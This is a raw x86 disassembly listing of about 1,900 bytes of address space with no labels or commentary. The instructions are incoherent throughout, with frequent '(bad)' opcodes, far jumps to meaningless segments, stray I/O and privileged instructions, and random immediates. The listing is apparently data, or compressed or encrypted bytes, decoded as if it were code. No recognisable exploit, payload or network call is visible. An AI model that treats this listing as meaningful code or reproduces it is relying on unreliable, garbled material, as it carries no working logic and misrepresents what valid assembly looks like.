  41b3d9:	ficom  WORD PTR [eax]
  41b3db:	adc    dh,dh
  41b3dd:	jmp    0x41b45a
  41b3df:	mov    ecx,DWORD PTR [ebx-0x63bd6c5b]
  41b3e5:	jmp    0x50e2:0xbe279182
  41b3ec:	into   
  41b3ed:	fld    QWORD PTR [ebp-0x22]
  41b3f0:	std    
  41b3f1:	cli    
  41b3f2:	jae    0x41b443
  41b3f4:	sub    BYTE PTR [eax+0x6308d190],dl
  41b3fa:	(bad)  
  41b3fb:	sub    DWORD PTR [esp+eiz*2-0x72],esi
  41b3ff:	leave  
  41b400:	enter  0xd6dd,0xf
  41b404:	cmc    
  41b405:	ins    DWORD PTR es:[edi],dx
  41b406:	div    bh
  41b408:	push   cs
  41b409:	push   esi
  41b40a:	xchg   ecx,eax
  41b40b:	xor    esi,DWORD PTR [ebp-0x4094c4]
  41b411:	rcl    al,cl
  41b413:	call   0x4a2b3e57
  41b418:	mov    dl,0xb5
  41b41a:	(bad)  
  41b41b:	or     eax,0x819dd1e3
  41b420:	fwait
  41b421:	(bad)  
  41b422:	xor    dl,ch
  41b424:	mov    cl,cl
  41b426:	mov    edi,0xc2ded858
  41b42b:	mov    bh,BYTE PTR [edi]
  41b42d:	xor    edi,DWORD PTR [ebx-0xcc1c37c]
  41b433:	call   FWORD PTR [esi-0xd94375a]
  41b439:	or     bl,BYTE PTR [eax+0x24bb61c9]
  41b43f:	dec    edx
  41b440:	sub    esp,esp
  41b442:	sbb    esp,DWORD PTR ds:0xf5673cc1
  41b448:	fwait
  41b449:	in     eax,dx
  41b44a:	ja     0x41b477
  41b44c:	and    BYTE PTR [esi+ebp*8],0xbd
  41b450:	ds push eax
  41b452:	mov    WORD PTR [ebp-0x7c],cs
  41b455:	push   esp
  41b456:	in     eax,dx
  41b457:	dec    ebx
  41b458:	mov    esi,0xf31e5883
  41b45d:	add    al,0x90
  41b45f:	(bad)  
  41b460:	call   DWORD PTR [ebx]
  41b462:	stos   DWORD PTR es:[edi],eax
  41b463:	cmp    al,0x91
  41b465:	xchg   ecx,eax
  41b466:	out    dx,eax
  41b467:	gs data16 cld 
  41b46a:	fimul  DWORD PTR [ecx-0x5b]
  41b46d:	dec    esi
  41b46e:	in     al,dx
  41b46f:	les    esp,FWORD PTR [esi]
  41b471:	arpl   WORD PTR [eax+0x71517a7d],dx
  41b477:	call   0x49fc9d46
  41b47c:	jmp    0xcead:0x3a6074d4
  41b483:	inc    ebx
  41b484:	fwait
  41b485:	xor    BYTE PTR ds:0x5abc2b36,cl
  41b48b:	fnsetpm(287 only) 
  41b48d:	in     al,0xbb
  41b48f:	inc    ecx
  41b490:	push   ecx
  41b491:	push   ebx
  41b492:	enter  0x23d9,0xd4
  41b496:	push   esi
  41b497:	data16 fwait
  41b499:	dec    edi
  41b49a:	les    ebx,FWORD PTR [edi]
  41b49c:	xchg   ebp,eax
  41b49d:	gs jns 0x41b44d
  41b4a0:	aam    0xdd
  41b4a2:	lahf   
  41b4a3:	push   esp
  41b4a4:	rcr    DWORD PTR [eax+ecx*4],1
  41b4a7:	xor    BYTE PTR [edx+0x7dea906a],ch
  41b4ad:	jge    0x41b4e5
  41b4af:	jle    0x41b455
  41b4b1:	mov    DWORD PTR [esi+0x4052c149],edi
  41b4b7:	xchg   bl,dl
  41b4b9:	xrstors [ebx+ebx*4+0x2]
  41b4be:	dec    esi
  41b4bf:	cwde   
  41b4c0:	pusha  
  41b4c1:	jg     0x41b525
  41b4c3:	test   eax,0xa091dde0
  41b4c8:	out    dx,eax
  41b4c9:	outs   dx,DWORD PTR ds:[esi]
  41b4ca:	mov    DWORD PTR [ebx+esi*1-0x3a176fc8],eax
  41b4d1:	dec    esi
  41b4d2:	or     al,0x7
  41b4d4:	(bad)  
  41b4d5:	mov    esp,0xb57e4ca0
  41b4da:	pop    ecx
  41b4db:	jg     0x41b4f0
  41b4dd:	test   eax,0x81df3778
  41b4e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4e3:	popf   
  41b4e4:	enter  0x8ff2,0x7
  41b4e8:	pushf  
  41b4e9:	fcmovb st,st(2)
  41b4eb:	push   cs
  41b4ec:	xchg   ebx,eax
  41b4ed:	sbb    eax,0x25f33148
  41b4f2:	sahf   
  41b4f3:	arpl   WORD PTR [edx+0x2b],bp
  41b4f6:	jo     0x41b4c9
  41b4f8:	sbb    eax,0x9b0b5c35
  41b4fd:	xor    al,BYTE PTR [edi+0x69]
  41b500:	int3   
  41b501:	out    dx,al
  41b502:	xchg   edi,eax
  41b503:	repnz enter 0x12e4,0xb1
  41b508:	xchg   esp,eax
  41b509:	(bad)  
  41b50b:	mov    ecx,0x25203a9c
  41b510:	fwait
  41b511:	lods   eax,DWORD PTR ds:[esi]
  41b512:	test   DWORD PTR [ebx],ebx
  41b514:	shr    ch,0x74
  41b517:	mov    esi,0xa4c919f1
  41b51c:	fwait
  41b51d:	xor    ch,cl
  41b51f:	in     eax,dx
  41b520:	js     0x41b50d
  41b522:	addr16 int 0x91
  41b525:	fst    QWORD PTR [eax+0x729b1a1b]
  41b52b:	or     BYTE PTR [eax+0x44],cl
  41b52e:	inc    ebp
  41b52f:	inc    edx
  41b530:	or     dh,cl
  41b532:	(bad)  
  41b533:	dec    ecx
  41b534:	sbb    DWORD PTR [eax+esi*8],eax
  41b537:	daa    
  41b538:	mov    ds:0x9b0336ef,al
  41b53d:	mov    bh,0x96
  41b53f:	cmp    edi,eax
  41b541:	push   edi
  41b542:	leave  
  41b543:	xchg   esp,eax
  41b544:	pop    ss
  41b545:	ficom  WORD PTR [ecx-0x75]
  41b548:	and    edi,DWORD PTR [esp+ecx*4]
  41b54b:	in     eax,0x3d
  41b54d:	inc    eax
  41b54e:	inc    eax
  41b54f:	std    
  41b550:	pushf  
  41b551:	les    edx,FWORD PTR [edx-0x2009e950]
  41b557:	or     cl,ah
  41b559:	pop    ecx
  41b55a:	jl     0x41b5bd
  41b55c:	into   
  41b55d:	fstp   QWORD PTR [ecx]
  41b55f:	cli    
  41b560:	stc    
  41b561:	push   ebx
  41b562:	enter  0x9d95,0xe8
  41b566:	or     BYTE PTR [edx-0xa3f0a65],dl
  41b56c:	mov    esi,0xf36be62f
  41b571:	frstor [edi]
  41b573:	aaa    
  41b574:	sbb    al,BYTE PTR [esp+ebx*4+0x53]
  41b578:	or     ah,ah
  41b57a:	nop
  41b57b:	(bad)  [ecx]
  41b57d:	push   ecx
  41b57e:	pop    edx
  41b57f:	bndstx [esi],bnd0
  41b582:	push   0xb5e0b80c
  41b587:	js     0x41b586
  41b589:	leave  
  41b58a:	stos   DWORD PTR es:[edi],eax
  41b58b:	ins    DWORD PTR es:[edi],dx
  41b58c:	jae    0x41b5a0
  41b58e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b58f:	shr    BYTE PTR [ecx+0x1ee73a92],cl
  41b595:	pop    esi
  41b596:	mov    dl,0x3
  41b598:	mov    eax,ds:0xfa9675a9
  41b59d:	push   ss
  41b59e:	nop
  41b59f:	(bad)  
  41b5a0:	js     0x41b56f
  41b5a2:	(bad)  
  41b5a3:	pop    edi
  41b5a4:	gs mov al,0x24
  41b5a8:	popa   
  41b5a9:	aam    0x28
  41b5ab:	sbb    eax,0x1fb7ddbd
  41b5b0:	inc    ecx
  41b5b1:	cdq    
  41b5b2:	fs cs push esp
  41b5b5:	in     eax,0x8f
  41b5b7:	mov    al,ds:0x47451fba
  41b5bc:	popa   
  41b5bd:	call   0xe95dff7c
  41b5c2:	into   
  41b5c3:	and    BYTE PTR [edi-0x6458bbd3],al
  41b5c9:	add    DWORD PTR [edx],esp
  41b5cb:	sub    al,0x43
  41b5cd:	sbb    ah,BYTE PTR [eax-0x6c]
  41b5d0:	enter  0x7cdd,0xb6
  41b5d4:	pop    edx
  41b5d5:	enter  0xf36e,0x9e
  41b5d9:	ficomp DWORD PTR [esi+0x21723b14]
  41b5df:	stos   BYTE PTR es:[edi],al
  41b5e0:	mov    eax,0xe6affb88
  41b5e5:	fisttp QWORD PTR [edx-0xf669b2f]
  41b5eb:	pop    es
  41b5ec:	xchg   esp,eax
  41b5ed:	out    0x7f,eax
  41b5ef:	sbb    ebx,DWORD PTR [ebx-0x4cc446a6]
  41b5f5:	ss clc 
  41b5f7:	cwde   
  41b5f8:	mov    ds:0x45d5f905,eax
  41b5fd:	push   edi
  41b5fe:	mov    eax,ds:0xc698fe65
  41b603:	leave  
  41b604:	inc    esi
  41b605:	xor    BYTE PTR [eax+0x73],ah
  41b608:	mov    bh,0x59
  41b60a:	xchg   ebx,eax
  41b60b:	inc    ebx
  41b60c:	repnz lds eax,FWORD PTR [edi+0x1b9db635]
  41b613:	mov    esp,0xc4353625
  41b618:	stos   BYTE PTR es:[edi],al
  41b619:	xor    eax,esi
  41b61b:	imul   edi,DWORD PTR [esi+0x7d],0xc26b1431
  41b622:	hlt    
  41b623:	jno    0x41b63f
  41b625:	xchg   ebx,eax
  41b626:	int    0xe5
  41b628:	push   ebp
  41b629:	fisttp WORD PTR [edx]
  41b62b:	push   esp
  41b62c:	rcl    DWORD PTR [ecx-0x6e],1
  41b62f:	sbb    DWORD PTR [edi+0x514a8e62],eax
  41b635:	mov    esp,0xf7b6b24c
  41b63a:	ja     0x41b5f0
  41b63c:	fwait
  41b63d:	aad    0x43
  41b63f:	pop    es
  41b640:	mov    esp,0x2b2c213
  41b645:	ficomp WORD PTR [ecx-0x7295f5b6]
  41b64b:	inc    esp
  41b64c:	rcr    BYTE PTR [ecx],cl
  41b64e:	jl     0x41b6b2
  41b650:	fwait
  41b651:	xor    bl,BYTE PTR [ebp-0x68]
  41b654:	and    eax,0x81a2ba7a
  41b659:	sbb    ecx,DWORD PTR [edi+0x7a]
  41b65c:	fwait
  41b65d:	mov    ah,0xd
  41b65f:	pusha  
  41b660:	rcr    BYTE PTR ds:0x789c23ad,0x22
  41b667:	inc    esi
  41b668:	aaa    
  41b669:	cmp    al,BYTE PTR ds:0xb47b93cb
  41b66f:	ret    
  41b670:	sahf   
  41b671:	fisttp QWORD PTR [ebx-0x54]
  41b674:	lock neg ecx
  41b677:	test   al,0xd9
  41b679:	push   es
  41b67a:	nop
  41b67b:	xor    esp,DWORD PTR [ebx]
  41b67d:	mov    ecx,0x69e33d0b
  41b682:	cmp    eax,0x5782bd4d
  41b687:	cmp    BYTE PTR [esi-0x24],0x38
  41b68b:	inc    ecx
  41b68c:	imul   edx,DWORD PTR ss:[eax-0x69e72175],0xec64103f
  41b697:	dec    ecx
  41b698:	xor    eax,0x81db3c95
  41b69d:	push   eax
  41b69e:	xchg   edi,eax
  41b69f:	mov    ecx,0x15918f9b
  41b6a4:	mov    edx,0x45d1e634
  41b6a9:	jbe    0x41b708
  41b6ab:	dec    edx
  41b6ac:	imul   eax,DWORD PTR [edi],0x9b999b46
  41b6b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6b3:	mov    esp,0x1a97bda2
  41b6b8:	fild   DWORD PTR [esi-0x5f510270]
  41b6be:	and    cl,BYTE PTR [edx-0x79]
  41b6c1:	ins    BYTE PTR es:[edi],dx
  41b6c2:	push   0xffffffc9
  41b6c4:	pop    es
  41b6c5:	imul   esp,edx,0xb
  41b6c8:	sahf   
  41b6c9:	stos   BYTE PTR es:[edi],al
  41b6ca:	pushf  
  41b6cb:	loop   0x41b6e6
  41b6cd:	shr    BYTE PTR [esi+0x78296bfa],1
  41b6d3:	cs call 0xe12a7cd2
  41b6d9:	sbb    eax,0x576d1f98
  41b6de:	mov    cl,0xd2
  41b6e0:	mov    ds:0x5ce6f81a,al
  41b6e5:	mov    edx,0xc00ce100
  41b6ea:	js     0x41b6af
  41b6ec:	paddsw mm1,QWORD PTR [ebp+0x704a8f61]
  41b6f3:	pop    esp
  41b6f4:	jle    0x41b6a2
  41b6f6:	stos   BYTE PTR es:[edi],al
  41b6f7:	and    al,0x9b
  41b6f9:	into   
  41b6fa:	cmp    bl,BYTE PTR [edi]
  41b6fc:	aad    0xb7
  41b6fe:	jp     0x41b74f
  41b700:	mov    bl,0xdd
  41b702:	repnz fst DWORD PTR [edi-0x58fb023d]
  41b709:	sub    eax,0x69d4eb93
  41b70e:	bound  edx,QWORD PTR [edi-0x42]
  41b711:	gs push ebx
  41b713:	cli    
  41b714:	fcmovnu st,st(5)
  41b716:	and    DWORD PTR [ebx+0x191237f2],esp
  41b71c:	xor    DWORD PTR [edx-0x70],0x32
  41b720:	push   edx
  41b721:	add    dh,bh
  41b723:	loopne 0x41b6f6
  41b725:	inc    edi
  41b726:	stc    
  41b727:	dec    ecx
  41b728:	(bad)
  41b72b:	mov    cl,0xe4
  41b72d:	lods   eax,DWORD PTR ds:[esi]
  41b72e:	xor    BYTE PTR [ebx-0x65],al
  41b731:	stos   BYTE PTR es:[edi],al
  41b732:	int3   
  41b733:	jmp    0x41b73c
  41b735:	(bad)  
  41b736:	xor    BYTE PTR fs:[ebx],dh
  41b739:	faddp  st(6),st
  41b73b:	mov    ah,0x9d
  41b73d:	cld    
  41b73e:	nop
  41b73f:	dec    edi
  41b740:	iret   
  41b741:	ins    DWORD PTR es:[edi],dx
  41b742:	nop
  41b743:	ffreep st(1)
  41b745:	push   ebx
  41b746:	shl    DWORD PTR [edi],0xf3
  41b749:	sub    BYTE PTR [ebx],dh
  41b74b:	dec    edx
  41b74c:	out    0xe8,eax
  41b74e:	(bad)  
  41b750:	jmp    0x9b9d3c82
  41b755:	jg     0x41b77a
  41b757:	int3   
  41b758:	lock mov DWORD PTR [eiz*2-0x4cf913dd],ebx
  41b760:	push   ss
  41b761:	jbe    0x41b6fa
  41b763:	cdq    
  41b764:	or     eax,0x832362be
  41b769:	es nop
  41b76b:	retf   
  41b76c:	ror    BYTE PTR [esi+edx*8+0x12],cl
  41b770:	scas   eax,DWORD PTR es:[edi]
  41b771:	xchg   esp,eax
  41b772:	dec    esp
  41b773:	dec    edx
  41b774:	dec    ecx
  41b775:	add    DWORD PTR [edx-0x7a],eax
  41b778:	mov    esp,0x975699b2
  41b77d:	imul   edx,DWORD PTR [ecx-0x49ce4450],0x57fb2b25
  41b787:	ss lock pop eax
  41b78a:	push   es
  41b78b:	fcmove st,st(7)
  41b78d:	ficomp WORD PTR [ecx-0x72]
  41b790:	sub    dl,BYTE PTR [ebp-0x78]
  41b793:	loopne 0x41b7a8
  41b795:	mov    dl,0x6d
  41b797:	cmp    BYTE PTR [ebx+0x422e4316],bl
  41b79d:	btr    DWORD PTR [ecx+esi*4+0x3d4c8305],eax
  41b7a5:	fisubr WORD PTR [esi-0x7e]
  41b7a8:	mov    ds:0xf9b3d53a,al
  41b7ad:	nop
  41b7ae:	nop
  41b7af:	stos   BYTE PTR es:[edi],al
  41b7b0:	sub    BYTE PTR [esi],bl
  41b7b2:	repnz loope 0x41b806
  41b7b5:	sbb    esi,DWORD PTR [esi]
  41b7b7:	jbe    0x41b7e2
  41b7b9:	adc    eax,0x7b944a51
  41b7be:	add    edi,ebp
  41b7c0:	jecxz  0x41b77a
  41b7c2:	nop
  41b7c3:	retf   
  41b7c4:	push   ds
  41b7c5:	push   esi
  41b7c6:	pop    ecx
  41b7c7:	outs   dx,BYTE PTR ds:[esi]
  41b7c8:	cld    
  41b7c9:	iret   
  41b7ca:	stos   BYTE PTR es:[edi],al
  41b7cb:	jmp    0x4a3da11a
  41b7d0:	scas   al,BYTE PTR es:[edi]
  41b7d1:	adc    al,0x3b
  41b7d3:	imul   ebp,DWORD PTR [esp+eax*2+0xa1a4da7],0x33c94f08
  41b7de:	hlt    
  41b7df:	mov    DWORD PTR [ebx+0x3005543c],ebx
  41b7e5:	jnp    0x41b7c4
  41b7e7:	dec    ecx
  41b7e8:	jb     0x41b7b7
  41b7ea:	sub    DWORD PTR [ebx],ebx
  41b7ec:	sbb    al,0x76
  41b7ee:	mov    bh,0x7d
  41b7f0:	xlat   BYTE PTR ds:[ebx]
  41b7f1:	xlat   BYTE PTR ds:[ebx]
  41b7f2:	sbb    eax,0x57f65bca
  41b7f7:	cwde   
  41b7f8:	in     eax,dx
  41b7f9:	imul   ecx,DWORD PTR ds:0xcdda74a6,0xc489b7e
  41b803:	and    al,0xee
  41b805:	ror    BYTE PTR [edi+0xdf09b13],cl
  41b80b:	fiadd  WORD PTR [edx]
  41b80d:	in     al,0xe
  41b80f:	inc    esi
  41b810:	inc    edx
  41b811:	int3   
  41b812:	fisttp WORD PTR [ecx+0x39]
  41b815:	cli    
  41b816:	push   0xffffffbb
  41b818:	add    eax,0x9b5f4887
  41b81d:	loopne 0x41b877
  41b81f:	ds xchg esi,eax
  41b821:	mov    cl,0xa7
  41b823:	call   0x9d8096b9
  41b828:	jb     0x41b812
  41b82a:	cmp    al,0xc2
  41b82c:	mov    es,WORD PTR [ebx]
  41b82e:	nop
  41b82f:	in     al,0xa1
  41b831:	add    al,0x8a
  41b833:	les    eax,FWORD PTR [esi]
  41b835:	stos   DWORD PTR es:[edi],eax
  41b836:	std    
  41b837:	dec    ecx
  41b838:	adc    al,0x10
  41b83a:	test   al,0x4b
  41b83c:	inc    edi
  41b83d:	xchg   edi,eax
  41b83e:	ss push bx
  41b841:	sbb    al,0x90
  41b843:	(bad)  
  41b844:	or     eax,0x6fdca67d
  41b849:	mov    ebx,0xc5f349cb
  41b84e:	and    ch,BYTE PTR [ebx-0x6b]
  41b851:	or     esi,esi
  41b853:	push   ss
  41b854:	mov    ds:0xfab283a9,al
  41b859:	dec    eax
  41b85a:	mov    al,ds:0x2b2be3b5
  41b85f:	les    ecx,FWORD PTR [ecx+0x70f79cde]
  41b865:	pop    ss
  41b866:	inc    eax
  41b867:	jle    0x41b8e5
  41b869:	nop
  41b86a:	xchg   edx,eax
  41b86b:	je     0x41b859
  41b86d:	cmp    DWORD PTR [edi],0x4c
  41b870:	push   es
  41b871:	ds pop edi
  41b873:	xchg   ebp,eax
  41b874:	sbb    dh,bl
  41b876:	mov    cs:0xef63284b,al
  41b87c:	push   eax
  41b87d:	scas   eax,DWORD PTR es:[edi]
  41b87e:	nop
  41b87f:	push   ebx
  41b880:	sub    bh,BYTE PTR [edx+eax*4+0x570b0d08]
  41b887:	dec    edx
  41b888:	fsub   DWORD PTR [ebp-0x102376dc]
  41b88e:	jl     0x41b8ed
  41b890:	mov    cl,0x8b
  41b892:	lea    ebx,[ebx+ebx*4-0x20a77974]
  41b899:	xchg   edi,eax
  41b89a:	in     eax,0xc0
  41b89c:	pop    edx
  41b89d:	fisub  WORD PTR [esp+esi*8-0x6d]
  41b8a1:	adc    DWORD PTR [edx+0x5a],ebp
  41b8a4:	dec    edx
  41b8a5:	int3   
  41b8a6:	push   es
  41b8a7:	in     eax,0x9b
  41b8a9:	fs enter 0x2ec8,0x96
  41b8ae:	xchg   esp,eax
  41b8af:	sub    eax,0x4b2abfdc
  41b8b4:	nop
  41b8b5:	(bad)  
  41b8b7:	ret    
  41b8b8:	cmp    al,0x8f
  41b8ba:	push   ebp
  41b8bb:	inc    esi
  41b8bc:	ror    eax,0x91
  41b8bf:	lock cdq 
  41b8c1:	lea    esi,[edx-0x5f]
  41b8c4:	mov    dl,0x35
  41b8c6:	push   ebp
  41b8c7:	cmc    
  41b8c8:	mov    ebx,0xc2c66207
  41b8cd:	fisttp QWORD PTR [ebx-0x6d3aba9]
  41b8d3:	outs   dx,DWORD PTR ds:[esi]
  41b8d4:	sar    BYTE PTR [eax+0x3d0f5a97],1
  41b8da:	mov    cl,0xfc
  41b8dc:	pop    esp
  41b8dd:	cli    
  41b8de:	pusha  
  41b8df:	int    0xbf
  41b8e1:	hlt    
  41b8e2:	ja     0x41b92e
  41b8e4:	sub    BYTE PTR [esi+0x2],dh
  41b8e7:	in     al,dx
  41b8e8:	(bad)  
  41b8e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8ea:	ficomp WORD PTR [esi-0x78]
  41b8ed:	(bad)  
  41b8ee:	ins    DWORD PTR es:[edi],dx
  41b8ef:	jle    0x41b893
  41b8f1:	imul   edx,edx,0x5021b126
  41b8f7:	jno    0x41b974
  41b8f9:	aam    0x79
  41b8fb:	dec    edx
  41b8fc:	add    DWORD PTR [ecx+0xe],ebx
  41b8ff:	out    0x5d,eax
  41b901:	adc    BYTE PTR [ebx-0x6441643d],dl
  41b907:	jno    0x41b975
  41b909:	mov    eax,ds:0xfc1fa76c
  41b90e:	add    eax,0x72de8047
  41b913:	ss xchg edx,eax
  41b915:	sbb    BYTE PTR [edi+0x58],dh
  41b918:	mov    ds:0x304bf852,al
  41b91d:	scas   al,BYTE PTR es:[edi]
  41b91e:	adc    BYTE PTR [ebx+0x3a],dl
  41b921:	inc    ecx
  41b922:	xchg   esp,eax
  41b923:	dec    ecx
  41b924:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b925:	dec    edx
  41b926:	push   es
  41b927:	or     dl,BYTE PTR [ebx-0x64333b41]
  41b92d:	in     al,0xab
  41b92f:	inc    ebx
  41b930:	outs   dx,DWORD PTR ds:[esi]
  41b931:	mov    cs,WORD PTR [ebx+ecx*4]
  41b934:	sub    al,0xed
  41b936:	push   esi
  41b937:	and    BYTE PTR [edi-0x5e],ah
  41b93a:	pop    esi
  41b93b:	fdivr  QWORD PTR [ebx-0x51d551f4]
  41b941:	mov    dh,0x90
  41b943:	fsubr  QWORD PTR [ebx+ebx*8+0x54c3f576]
  41b94a:	xchg   ebx,eax
  41b94c:	or     esi,ebx
  41b94e:	jp     0x41b92c
  41b950:	mov    cl,0xa0
  41b952:	aaa    
  41b953:	cs xchg ecx,eax
  41b955:	daa    
  41b956:	xchg   edi,eax
  41b957:	es out dx,eax
  41b959:	punpckhwd mm7,mm1
  41b95c:	mov    ds:0xfcf5089,al
  41b961:	pop    ebx
  41b962:	dec    esp
  41b963:	push   ecx
  41b964:	adc    al,0x7b
  41b966:	push   esi
  41b967:	xor    BYTE PTR [ecx],ah
  41b969:	cs clc 
  41b96b:	lods   al,BYTE PTR ds:[esi]
  41b96c:	push   0xffffff8b
  41b96e:	nop
  41b96f:	mov    BYTE PTR [edi+0xb729c79],ch
  41b975:	outs   dx,DWORD PTR ds:[esi]
  41b976:	sbb    cl,BYTE PTR [ebx+0x2f]
  41b979:	rep stos BYTE PTR es:[edi],al
  41b97b:	lea    esi,[ebx+0x6b40c9e3]
  41b981:	dec    esp
  41b982:	(bad)  
  41b983:	or     eax,0x6d11329c
  41b988:	inc    DWORD PTR [ecx]
  41b98a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b98b:	mov    BYTE PTR [eax-0x1c494f59],dl
  41b991:	pop    eax
  41b992:	test   eax,0x61436e4c
  41b997:	or     DWORD PTR [ecx+0x62a7606b],0xf
  41b99e:	jl     0x41b9a2
  41b9a0:	test   DWORD PTR [ebp+edx*4-0x583924dc],ebx
  41b9a7:	mov    bl,BYTE PTR [ebx]
  41b9a9:	wbinvd 
  41b9ab:	ds test al,0xdd
  41b9ae:	pop    ss
  41b9af:	and    ah,ch
  41b9b1:	mov    bh,0x67
  41b9b3:	imul   ebp,DWORD PTR [edi+0x8629026],0x305819fa
  41b9bd:	xor    ch,dh
  41b9bf:	pop    esp
  41b9c0:	cdq    
  41b9c1:	mov    al,ds:0xd42c4a50
  41b9c6:	es push es
  41b9c8:	cmp    DWORD PTR [edx],edi
  41b9ca:	nop
  41b9cb:	and    BYTE PTR [edi],dl
  41b9cd:	jno    0x41b9dc
  41b9cf:	xchg   di,ax
  41b9d1:	push   edx
  41b9d2:	ja     0x41ba16
  41b9d4:	xor    bl,dh
  41b9d6:	and    BYTE PTR [ebx-0x7c],bl
  41b9d9:	pop    eax
  41b9da:	push   DWORD PTR [eax+esi*2+0x34]
  41b9de:	dec    eax
  41b9df:	sbb    BYTE PTR [esi+0x685fe58f],0x0
  41b9e6:	or     al,0x1e
  41b9e8:	sbb    eax,DWORD PTR [ecx]
  41b9ea:	cli    
  41b9eb:	nop
  41b9ec:	repnz fnsave [edi]
  41b9ef:	or     edx,edx
  41b9f1:	scas   eax,DWORD PTR es:[edi]
  41b9f2:	in     eax,dx
  41b9f3:	jo     0x41ba58
  41b9f5:	jge    0x41b988
  41b9f7:	sar    DWORD PTR [eax+ebx*1-0x2c],1
  41b9fb:	mov    dh,0x9f
  41b9fd:	jnp    0x41b9ff
  41b9ff:	mov    esi,0xa051e169
  41ba04:	mov    eax,ds:0x7b2a1428
  41ba09:	xchg   esp,eax
  41ba0b:	pop    edx
  41ba0c:	mov    eax,0x6286287c
  41ba11:	aam    0x72
  41ba13:	xchg   esi,eax
  41ba14:	sti    
  41ba15:	inc    esp
  41ba16:	test   BYTE PTR [eax-0x72],ch
  41ba19:	fisubr WORD PTR [ebx-0x22]
  41ba1c:	stc    
  41ba1d:	ins    BYTE PTR es:[edi],dx
  41ba1e:	xor    eax,0x94f38a60
  41ba23:	lock call 0x5b4c4745
  41ba29:	fild   DWORD PTR ds:0x64ddddb0
  41ba2f:	cli    
  41ba30:	retf   
  41ba31:	out    dx,al
  41ba32:	or     eax,0x903e7404
  41ba37:	les    edx,FWORD PTR [eax-0x2]
  41ba3a:	mov    ebx,0x1f4695a7
  41ba3f:	loop   0x41baa5
  41ba41:	fbld   TBYTE PTR [edx+0x21996eb0]
  41ba47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba48:	ss ds push eax
  41ba4b:	dec    esi
  41ba4c:	popf   
  41ba4d:	mov    ss,WORD PTR [edi+0x26cfbf7]
  41ba53:	stos   BYTE PTR es:[edi],al
  41ba54:	je     0x41b9f6
  41ba56:	sbb    DWORD PTR [ecx-0x37],0xd
  41ba5a:	adc    eax,0x8793bef
  41ba5f:	pop    edx
  41ba60:	push   edx
  41ba61:	(bad)  
  41ba62:	nop
  41ba63:	jbe    0x41bab1
  41ba65:	out    0x15,eax
  41ba67:	mov    ds:0xc032e2a1,eax
  41ba6c:	lahf   
  41ba6d:	loop   0x41ba61
  41ba6f:	and    al,0x67
  41ba71:	mov    ah,0xdc
  41ba73:	leave  
  41ba74:	cli    
  41ba75:	sub    DWORD PTR [edx-0x7d],0x8dda1aa2
  41ba7c:	jnp    0x41ba91
  41ba7e:	retf   
  41ba7f:	leave  
  41ba80:	xor    DWORD PTR [ebx-0x16190895],0xfffffffd
  41ba87:	push   eax
  41ba88:	jecxz  0x41ba46
  41ba8a:	pop    eax
  41ba8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba8c:	fwait
  41ba8d:	(bad)  
  41ba8e:	jle    0x41ba10
  41ba90:	sbb    BYTE PTR [edx],bh
  41ba92:	push   esp
  41ba93:	jnp    0x41bafe
  41ba95:	loope  0x41ba17
  41ba97:	sub    al,0xe5
  41ba99:	inc    edi
  41ba9a:	out    0xcb,eax
  41ba9c:	and    esp,DWORD PTR [ecx+0x1ad9f148]
  41baa2:	push   edi
  41baa3:	retf   0x25a0
  41baa6:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41baa8:	sub    BYTE PTR [ebx+0x4c],dh
  41baab:	dec    edx
  41baac:	ret    
  41baad:	add    BYTE PTR [edi+0xe19bfac],cl
  41bab3:	mov    dh,0xd8
  41bab5:	bound  ecx,QWORD PTR [esi+0x19e62aca]
  41babb:	xor    al,0xdc
  41babd:	jmp    0x41baf0
  41babf:	dec    edx
  41bac0:	inc    edi
  41bac1:	cld    
  41bac2:	enter  0x8c75,0xa4
  41bac6:	aad    0x73
  41bac8:	test   eax,0xbba26f03
  41bacd:	arpl   WORD PTR [edx+0x30],sp
  41bad0:	adc    ebx,esi
  41bad2:	pushf  
  41bad3:	xchg   esi,eax
  41bad4:	in     al,dx
  41bad5:	mov    dh,0x2f
  41bad7:	movaps XMMWORD PTR [eax],xmm1
  41bada:	nop
  41badb:	adc    eax,0x6ea5711f
  41bae0:	loop   0x41bad8
  41bae2:	mov    bh,0x49
  41bae4:	das    
  41bae5:	xchg   BYTE PTR [eax-0x75eadfe9],cl
  41baeb:	inc    edi
  41baec:	fwait
  41baed:	loope  0x41bb4a
  41baef:	int    0x11
  41baf1:	add    ebp,ebx
  41baf3:	fidivr WORD PTR [esi-0x22]
  41baf6:	push   0xffffff85
  41baf8:	sbb    bh,BYTE PTR [edx]
  41bafa:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41bafc:	add    ebx,DWORD PTR [edx-0x70]
  41baff:	int    0xce
  41bb01:	mov    edx,0x7181967d
  41bb06:	or     BYTE PTR [edx+0x5d],cl
  41bb09:	jmp    0x4ec0:0xdd76fe44
  41bb10:	fwait
  41bb11:	xor    al,0x1
  41bb13:	stc    
  41bb14:	adc    ah,0x65
  41bb17:	aas    
  41bb18:	cmp    BYTE PTR [esi],dl
  41bb1a:	xor    ch,BYTE PTR [edi]
  41bb1c:	sahf   
  41bb1d:	push   0xc91a9ece
  41bb22:	and    BYTE PTR [edi+0x3990a0a3],dl
  41bb28:	sub    DWORD PTR [edx+edi*1+0x1524c384],0x4d
  41bb30:	enter  0xa834,0xc1
  41bb34:	rol    DWORD PTR [ecx+0x30],cl
  41bb37:	loopne 0x41bac8
  41bb39:	push   ds
  41bb3a:	retf   
  41bb3b:	fstp   QWORD PTR [ebx+0x61]
  41bb3e:	xchg   edx,eax
  41bb3f:	lds    eax,FWORD PTR [edi+0x63]
  41bb42:	dec    ebx
  41bb43:	xor    ah,BYTE PTR [edi]
  41bb45:	loope  0x41bb02
  41bb47:	dec    ebp
  41bb48:	je     0x41bba2
  41bb4a:	lods   eax,DWORD PTR ds:[esi]
  41bb4b:	jmp    0x56ac:0xc5909be1
  41bb52:	call   DWORD PTR [ecx+0x4a415abb]
  41bb58:	xor    edx,DWORD PTR [esi+0x6]
